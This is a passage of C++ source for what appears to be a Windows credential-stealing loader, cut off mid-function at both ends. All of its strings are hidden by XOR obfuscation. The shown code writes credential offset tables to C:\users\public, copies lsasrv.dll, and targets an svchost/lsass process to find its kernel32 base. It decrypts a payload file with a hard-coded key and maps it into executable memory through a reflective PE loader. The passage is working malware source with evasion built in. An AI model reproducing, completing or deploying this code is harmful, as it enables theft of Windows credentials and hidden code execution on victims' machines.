			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out + 3 + 7, 123, _fuckingstring, _offset_table[i][0]);

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out + 3 + 7 + 8, 123, _fuckingstring, _offset_table[i][1]);

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, _fuckingstring, _offset_table[i][2]);

			// credential offset

		//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);

			// 

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, _fuckingstring, offset____);

			// 

				// _3des_aes_len_offset   windows10windows7

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 51; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, _fuckingstring, _offset_table[i][4]);



			// 

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 114; _fuckingstring[2] = 1; FBXorCrypt(_fuckingstring, 3);
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8 + 2, 123, _fuckingstring, res);





			FILE* fptr;

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
			if (FBFileExists(_fuckingstring))DeleteFileA(_fuckingstring);

			// Open a file in writing mode

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
			fopen_s(&fptr, _fuckingstring, "w");



			// Write some text to the file

			fprintf(fptr, write_out);



			// Close the file

			fclose(fptr);

			break;

		}

	}

	if (!offset) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 44; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 116; _fuckingstring[5] = 111; _fuckingstring[6] = 106; _fuckingstring[7] = 111; _fuckingstring[8] = 110; _fuckingstring[9] = 118; _fuckingstring[10] = 111; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 100; _fuckingstring[14] = 115; _fuckingstring[15] = 114; _fuckingstring[16] = 104; _fuckingstring[17] = 110; _fuckingstring[18] = 111; _fuckingstring[19] = 33; _fuckingstring[20] = 110; _fuckingstring[21] = 115; _fuckingstring[22] = 33; _fuckingstring[23] = 111; _fuckingstring[24] = 110; _fuckingstring[25] = 33; _fuckingstring[26] = 108; _fuckingstring[27] = 101; _fuckingstring[28] = 52; _fuckingstring[29] = 33; _fuckingstring[30] = 108; _fuckingstring[31] = 96; _fuckingstring[32] = 117; _fuckingstring[33] = 98; _fuckingstring[34] = 105; _fuckingstring[35] = 100; _fuckingstring[36] = 101; _fuckingstring[37] = 45; _fuckingstring[38] = 33; _fuckingstring[39] = 96; _fuckingstring[40] = 99; _fuckingstring[41] = 110; _fuckingstring[42] = 115; _fuckingstring[43] = 117; _fuckingstring[44] = 47; _fuckingstring[45] = 47; _fuckingstring[46] = 47; _fuckingstring[47] = 11; _fuckingstring[48] = 1; FBXorCrypt(_fuckingstring, 49);
		printf(_fuckingstring);

		free(res);

		// 

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
		char PasdadsaATH[1024];
		memcpy(PasdadsaATH, _fuckingstring, 100);


		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 56; _fuckingstring[17] = 96; _fuckingstring[18] = 117; _fuckingstring[19] = 51; _fuckingstring[20] = 1; FBXorCrypt(_fuckingstring, 21);
		char PasdadsaATH2[100];
		memcpy(PasdadsaATH2, _fuckingstring, 100);

		if (FBFileExists(PasdadsaATH2))DeleteFileA(PasdadsaATH2);

		CopyFileA(PasdadsaATH, PasdadsaATH2, FALSE);

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 104; _fuckingstring[2] = 109; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 98; _fuckingstring[6] = 110; _fuckingstring[7] = 113; _fuckingstring[8] = 104; _fuckingstring[9] = 100; _fuckingstring[10] = 101; _fuckingstring[11] = 33; _fuckingstring[12] = 117; _fuckingstring[13] = 110; _fuckingstring[14] = 33; _fuckingstring[15] = 113; _fuckingstring[16] = 116; _fuckingstring[17] = 99; _fuckingstring[18] = 109; _fuckingstring[19] = 104; _fuckingstring[20] = 98; _fuckingstring[21] = 33; _fuckingstring[22] = 103; _fuckingstring[23] = 110; _fuckingstring[24] = 109; _fuckingstring[25] = 101; _fuckingstring[26] = 100; _fuckingstring[27] = 115; _fuckingstring[28] = 33; _fuckingstring[29] = 38; _fuckingstring[30] = 56; _fuckingstring[31] = 96; _fuckingstring[32] = 117; _fuckingstring[33] = 51; _fuckingstring[34] = 38; _fuckingstring[35] = 45; _fuckingstring[36] = 113; _fuckingstring[37] = 109; _fuckingstring[38] = 100; _fuckingstring[39] = 96; _fuckingstring[40] = 114; _fuckingstring[41] = 100; _fuckingstring[42] = 33; _fuckingstring[43] = 115; _fuckingstring[44] = 100; _fuckingstring[45] = 117; _fuckingstring[46] = 115; _fuckingstring[47] = 104; _fuckingstring[48] = 100; _fuckingstring[49] = 119; _fuckingstring[50] = 100; _fuckingstring[51] = 33; _fuckingstring[52] = 104; _fuckingstring[53] = 117; _fuckingstring[54] = 11; _fuckingstring[55] = 1; FBXorCrypt(_fuckingstring, 56);
		printf(_fuckingstring);

		// 

#ifdef jinyongyutiaoshi

		//goto caonimade;

#endif // jinyongyutiaoshi



		exit(-1);

	}

	free(res);





caonimade:





#ifdef jinyongyutiaoshi

	//MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 33; _fuckingstring[23] = 44; _fuckingstring[24] = 33; _fuckingstring[25] = 66; _fuckingstring[26] = 110; _fuckingstring[27] = 113; _fuckingstring[28] = 120; _fuckingstring[29] = 1; FBXorCrypt(_fuckingstring, 30);
	//CopyFileA(_fuckingstring, "C:\\users\\public\\ili6ao", TRUE);

#endif // jinyongyutiaoshi



// shellcodeshellcode



// svchostpid

	DWORD _svchost_1_pid = GetLsvchostsassPid();



	//notepad

#ifdef jinyongyutiaoshi

	//_svchost_1_pid = defincaoniam;

#endif // jinyongyutiaoshi





// modulekernel32.dllbase addr



	  // Open the target process

	HANDLE target_hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _svchost_1_pid);

	DWORD64 _target_process_kernel32_base_addr = 0;

	if (target_hProcess) {

		HMODULE hModuleArray[1024];

		DWORD cbNeeded;



		// Enumerate the modules of the target process

		if (EnumProcessModules(target_hProcess, hModuleArray, sizeof(hModuleArray), &cbNeeded)) {

			for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {

				char szModuleName[MAX_PATH];



				// Get the module file name

				if (GetModuleFileNameExA(target_hProcess, hModuleArray[i], szModuleName, MAX_PATH)) {

#ifdef jinyongyutiaoshi

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 110; _fuckingstring[2] = 101; _fuckingstring[3] = 116; _fuckingstring[4] = 109; _fuckingstring[5] = 100; _fuckingstring[6] = 33; _fuckingstring[7] = 111; _fuckingstring[8] = 96; _fuckingstring[9] = 108; _fuckingstring[10] = 100; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
					printf(_fuckingstring, szModuleName);

#endif // jinyongyutiaoshi

					// modulekernel32.dll

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
					//char _fuckingstring[13] = _fuckingstring;

					//if (strcmp("kernel32.dll", szModuleName) == 0 || strcmp("KERNEL32.DLL", szModuleName) == 0) {

					//	// base addr

					//	_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);

					//	break;

					//}

					int flag = 1;

					for (int j = 0; j < 12; j++) {

						if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j] - 32 != szModuleName[strlen(szModuleName) - 1 - j])) {

							flag = 0;

							break;



						}

					}

					if (flag) {

						_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);

						break;

					}

				}

			}

		}



		// Close the handle to the target process

		CloseHandle(target_hProcess);

	}

	else {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 98; _fuckingstring[1] = 96; _fuckingstring[2] = 111; _fuckingstring[3] = 33; _fuckingstring[4] = 111; _fuckingstring[5] = 110; _fuckingstring[6] = 117; _fuckingstring[7] = 33; _fuckingstring[8] = 110; _fuckingstring[9] = 113; _fuckingstring[10] = 100; _fuckingstring[11] = 111; _fuckingstring[12] = 33; _fuckingstring[13] = 117; _fuckingstring[14] = 96; _fuckingstring[15] = 115; _fuckingstring[16] = 102; _fuckingstring[17] = 100; _fuckingstring[18] = 117; _fuckingstring[19] = 33; _fuckingstring[20] = 113; _fuckingstring[21] = 115; _fuckingstring[22] = 110; _fuckingstring[23] = 98; _fuckingstring[24] = 100; _fuckingstring[25] = 114; _fuckingstring[26] = 114; _fuckingstring[27] = 45; _fuckingstring[28] = 33; _fuckingstring[29] = 100; _fuckingstring[30] = 115; _fuckingstring[31] = 115; _fuckingstring[32] = 110; _fuckingstring[33] = 115; _fuckingstring[34] = 33; _fuckingstring[35] = 98; _fuckingstring[36] = 110; _fuckingstring[37] = 101; _fuckingstring[38] = 100; _fuckingstring[39] = 59; _fuckingstring[40] = 33; _fuckingstring[41] = 36; _fuckingstring[42] = 121; _fuckingstring[43] = 11; _fuckingstring[44] = 1; FBXorCrypt(_fuckingstring, 45);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}





















	// shellcode

	// shellcodePE

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 101; _fuckingstring[17] = 96; _fuckingstring[18] = 117; _fuckingstring[19] = 96; _fuckingstring[20] = 47; _fuckingstring[21] = 99; _fuckingstring[22] = 104; _fuckingstring[23] = 111; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
	const char* filePath = _fuckingstring; // Replace with your file path



	// Open the file for reading

	HANDLE hFile = CreateFileA(

		filePath,                   // File path

		GENERIC_READ,               // Access mode (read)

		FILE_SHARE_READ,            // Share mode (allow others to read)

		NULL,                       // Security attributes (default)

		OPEN_EXISTING,              // Creation disposition (open only if it exists)

		FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)

		NULL                        // Template file (not used)

	);



	if (hFile == INVALID_HANDLE_VALUE) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 110; _fuckingstring[7] = 113; _fuckingstring[8] = 100; _fuckingstring[9] = 111; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 117; _fuckingstring[15] = 105; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 103; _fuckingstring[19] = 104; _fuckingstring[20] = 109; _fuckingstring[21] = 100; _fuckingstring[22] = 11; _fuckingstring[23] = 1; FBXorCrypt(_fuckingstring, 24);
		fprintf(stderr, _fuckingstring);

		return 1;

	}



	// Get the file size

	DWORD fileSize = GetFileSize(hFile, NULL);

	if (fileSize == INVALID_FILE_SIZE) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 102; _fuckingstring[7] = 100; _fuckingstring[8] = 117; _fuckingstring[9] = 117; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 104; _fuckingstring[16] = 109; _fuckingstring[17] = 100; _fuckingstring[18] = 33; _fuckingstring[19] = 114; _fuckingstring[20] = 104; _fuckingstring[21] = 123; _fuckingstring[22] = 100; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
		fprintf(stderr, _fuckingstring);

		CloseHandle(hFile);

		return 1;

	}



	// Allocate memory for the byte array

	BYTE* byteArray = (BYTE*)malloc(fileSize);

	if (byteArray == NULL) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 96; _fuckingstring[7] = 109; _fuckingstring[8] = 109; _fuckingstring[9] = 110; _fuckingstring[10] = 98; _fuckingstring[11] = 96; _fuckingstring[12] = 117; _fuckingstring[13] = 104; _fuckingstring[14] = 111; _fuckingstring[15] = 102; _fuckingstring[16] = 33; _fuckingstring[17] = 108; _fuckingstring[18] = 100; _fuckingstring[19] = 108; _fuckingstring[20] = 110; _fuckingstring[21] = 115; _fuckingstring[22] = 120; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
		fprintf(stderr, _fuckingstring);

		CloseHandle(hFile);

		return 1;

	}



	// Read the binary data from the file into the byte array

	DWORD bytesRead;

	if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 115; _fuckingstring[7] = 100; _fuckingstring[8] = 96; _fuckingstring[9] = 101; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 115; _fuckingstring[16] = 110; _fuckingstring[17] = 108; _fuckingstring[18] = 33; _fuckingstring[19] = 117; _fuckingstring[20] = 105; _fuckingstring[21] = 100; _fuckingstring[22] = 33; _fuckingstring[23] = 103; _fuckingstring[24] = 104; _fuckingstring[25] = 109; _fuckingstring[26] = 100; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
		fprintf(stderr, _fuckingstring);

		CloseHandle(hFile);

		free(byteArray);

		return 1;

	}



	// Close the file handle

	CloseHandle(hFile);



	// Now byteArray contains the binary data from the file



	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 82; _fuckingstring[1] = 116; _fuckingstring[2] = 98; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 103; _fuckingstring[8] = 116; _fuckingstring[9] = 109; _fuckingstring[10] = 109; _fuckingstring[11] = 120; _fuckingstring[12] = 33; _fuckingstring[13] = 115; _fuckingstring[14] = 100; _fuckingstring[15] = 96; _fuckingstring[16] = 101; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 109; _fuckingstring[20] = 116; _fuckingstring[21] = 33; _fuckingstring[22] = 99; _fuckingstring[23] = 120; _fuckingstring[24] = 117; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 33; _fuckingstring[28] = 103; _fuckingstring[29] = 115; _fuckingstring[30] = 110; _fuckingstring[31] = 108; _fuckingstring[32] = 33; _fuckingstring[33] = 117; _fuckingstring[34] = 105; _fuckingstring[35] = 100; _fuckingstring[36] = 33; _fuckingstring[37] = 103; _fuckingstring[38] = 104; _fuckingstring[39] = 109; _fuckingstring[40] = 100; _fuckingstring[41] = 59; _fuckingstring[42] = 33; _fuckingstring[43] = 36; _fuckingstring[44] = 114; _fuckingstring[45] = 11; _fuckingstring[46] = 1; FBXorCrypt(_fuckingstring, 47);
	printf(_fuckingstring, bytesRead, filePath);



	// Free the memory allocated for the byte array

	//free(byteArray);

	// byteArray

	// key10key

	//char _fuckingstring[100];

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 104; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 111; _fuckingstring[4] = 108; _fuckingstring[5] = 96; _fuckingstring[6] = 111; _fuckingstring[7] = 0; FBXorCrypt(_fuckingstring, 8);

	for (int i = 0; i < fileSize; i++) {

		byteArray[i] = byteArray[i] ^ (_fuckingstring[i % 7]);

	}











	// uiLibraryAddressPE

	ULONG_PTR uiLibraryAddress = reinterpret_cast<DWORD64>(byteArray);

	ULONG_PTR uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// optionalheadesizeofimage

	ULONG_PTR uiBaseAddress = (ULONG_PTR)VirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);



	DWORD64 _pe_addr_load_in_current_process = uiBaseAddress;



	DWORD _memeoy_size_to_be_allocated_in_target_process = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage;

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 49; _fuckingstring[1] = 121; _fuckingstring[2] = 36; _fuckingstring[3] = 113; _fuckingstring[4] = 33; _fuckingstring[5] = 99; _fuckingstring[6] = 120; _fuckingstring[7] = 117; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 33; _fuckingstring[11] = 118; _fuckingstring[12] = 104; _fuckingstring[13] = 109; _fuckingstring[14] = 109; _fuckingstring[15] = 33; _fuckingstring[16] = 99; _fuckingstring[17] = 100; _fuckingstring[18] = 33; _fuckingstring[19] = 96; _fuckingstring[20] = 109; _fuckingstring[21] = 109; _fuckingstring[22] = 110; _fuckingstring[23] = 98; _fuckingstring[24] = 96; _fuckingstring[25] = 117; _fuckingstring[26] = 100; _fuckingstring[27] = 101; _fuckingstring[28] = 33; _fuckingstring[29] = 104; _fuckingstring[30] = 111; _fuckingstring[31] = 33; _fuckingstring[32] = 117; _fuckingstring[33] = 96; _fuckingstring[34] = 115; _fuckingstring[35] = 102; _fuckingstring[36] = 100; _fuckingstring[37] = 117; _fuckingstring[38] = 33; _fuckingstring[39] = 113; _fuckingstring[40] = 115; _fuckingstring[41] = 110; _fuckingstring[42] = 98; _fuckingstring[43] = 100; _fuckingstring[44] = 114; _fuckingstring[45] = 114; _fuckingstring[46] = 11; _fuckingstring[47] = 1; FBXorCrypt(_fuckingstring, 48);
	printf(_fuckingstring, reinterpret_cast<DWORD64*>((DWORD64)_memeoy_size_to_be_allocated_in_target_process));



	ULONG_PTR uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;

	// uiLibraryAddress

	// 

	ULONG_PTR uiValueB = uiLibraryAddress;

	ULONG_PTR uiValueC = uiBaseAddress;//dll



	while (uiValueA--) // headersize

		*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;



	// STEP 3: load in all of our sections...

	// 

	// uiValueA = the VA of the first section

	// SizeOfOptionalHeadersize

	uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueAsection header

	// 

	// itterate through all sections, loading them into memory.

	ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;

	while (uiValueE--)

	{

		// uiValueB is the VA for this section

		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);// section header



		// uiValueC is the VA for this sections data

		// 

		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);



		// copy the section over

		// 

		ULONG_PTR	uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;



		// 

		while (uiValueD--)

			*(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;



		// get the VA of the next section

	// 

		uiValueA += sizeof(IMAGE_SECTION_HEADER);

	}





	// STEP 4: process our images import table...

	// dll   

	// dll



	// uiValueB = the address of the import directory

	// 

	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];



	// we assume their is an import table to process

	// uiValueC is the first entry in the import table

	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);





	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
	DWORD64 _current_process_kern32_base_addr = reinterpret_cast<DWORD64>(GetModuleHandleA(_fuckingstring));

	// itterate through all imports

	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)

	{

		// use LoadLibraryA to load the imported module into memory

		//PEdll

		// windowskernel32

		// kernel32dllgetmodule

		// uiLibraryAddress = (ULONG_PTR)LoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

		uiLibraryAddress = _current_process_kern32_base_addr;

		// uiValueD = VA of the OriginalFirstThunk

		DWORD64	uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);



		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)

		// thunkIAT

		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);



		// itterate through all imported functions, importing by ordinal if no name present

		while (DEREF(uiValueA))

		{

			// sanity check uiValueD as some compilers only import by FirstThunk

			// ordinalfuncname



	// uiValueDrvaImportLookupTable0x8000000000000000andordinal

			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)

			{

				// uiLibraryAddressDLLDLLNT Header

				ULONG_PTR	uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;



				// DLLDATA_DIRECTORY

				ULONG_PTR	uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];



				// DLL

				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);



				// 

				ULONG_PTR	uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);



				// ordinalbitordinal

				// and0xFFFF16bitordinal

				// ordinal valuebaseentry4bytes4DLL

				// dlldll

				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));



				// +rvaImportAddressTable

				// kernel32

			//	DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));

				DEREF(uiValueA) = (_target_process_kernel32_base_addr + DEREF_32(uiAddressArray));

			}

			else

			{

				// bit0uiValueDIMAGE_IMPORT_BY_NAMErva

				// PEIMAGE_IMPORT_BY_NAME

				uiValueB = (uiBaseAddress + DEREF(uiValueD));



				// GetProcAddressrvaImportAddressTable

				//

				// DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);

#ifdef jinyongyutiaoshi

